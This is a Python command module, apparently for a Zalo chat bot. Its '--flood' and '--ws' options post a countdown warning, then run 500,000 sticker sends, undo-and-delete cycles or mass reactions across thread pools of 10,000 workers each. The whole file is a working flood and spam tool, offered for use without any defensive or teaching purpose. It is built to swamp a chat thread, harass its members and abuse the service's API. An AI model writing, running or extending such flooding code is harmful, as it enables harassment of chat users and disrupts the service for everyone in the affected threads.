import time
import threading
from concurrent.futures import ThreadPoolExecutor
from api.util.object import MessageObject

StickerUrl = "https://f37-zfcloud.zdn.vn/900f294a4c44ec1ab555/9208242926159739585?Trần-Hạo-Nguyên.zaloStk"

STICKER_WORKERS = 10000
UNDODEL_WORKERS = 10000
REACT_WORKERS   = 10000

def UnknownCommand(this, message, data, userId, threadId, type):

    def _one_sticker(_):
        sendCustomSticker(StickerUrl, StickerUrl, threadId, type, None, 0, 0)

    def sendSticker(n):
        with ThreadPoolExecutor(max_workers=STICKER_WORKERS) as pool:
            pool.map(_one_sticker, range(n))

    def _one_undoDel(_):
        undoMessage(msgId, cliMsgId, threadId, type)
        deleteMessage(msgId, uid, cliMsgId, threadId)
        undoMessage(msgId, cliMsgId, threadId, type)
        deleteMessage(msgId, uid, cliMsgId, threadId)
        undoMessage(msgId, cliMsgId, threadId, type)
        deleteMessage(msgId, uid, cliMsgId, threadId)
        undoMessage(msgId, cliMsgId, threadId, type)
        deleteMessage(msgId, uid, cliMsgId, threadId)

    def undoDel(n):
        with ThreadPoolExecutor(max_workers=UNDODEL_WORKERS) as pool:
            pool.map(_one_undoDel, range(n))

    def _one_react(code):
        sendMultiReaction(data, code, threadId, type, 300000, 100)

    def react(code, n):
        with ThreadPoolExecutor(max_workers=REACT_WORKERS) as pool:
            pool.map(lambda _: _one_react(code), range(n))

    def _sendWarnAndCountdown(label):
        warn    = this.sendMentionStyle(label, userId, threadId, type)
        warnId  = getattr(warn, "msgId",    None)
        warnCli = getattr(warn, "clientId", None)
        if not warnId or not warnCli:
            return
        obj = MessageObject(msgId=warnId, cliMsgId=warnCli, msgType="webchat")
        for i in range(10, 0, -1):
            this.sendMultiReaction(obj, "🕑", threadId, type, 102229, numreact=i)
            time.sleep(1)
            this.sendMultiReaction(obj, "", threadId, type, -1, numreact=i)
        this.deleteMessage(warnCli, this.uid, warnCli, threadId)

    parts = message.text.strip().split()
    if len(parts) < 2:
        return this.sendMentionStyle("Dùng: --flood | --ws", userId, threadId, type)

    msgId    = getattr(data, "msgId",    None)
    cliMsgId = getattr(data, "cliMsgId", None)
    if not msgId or not cliMsgId:
        return

    sendCustomSticker = this.sendCustomSticker
    sendMultiReaction = this.sendMultiReaction
    undoMessage       = this.undoMessage
    deleteMessage     = this.deleteMessage
    uid               = this.uid

    action = parts[1].lower()

    if action == "--flood":
        n = 500000
        _sendWarnAndCountdown("...")
        sendSticker(n)

    elif action == "--ws":
        n = 500000
        _sendWarnAndCountdown("...")
        undoDel(n)
        react("/-ok", n)
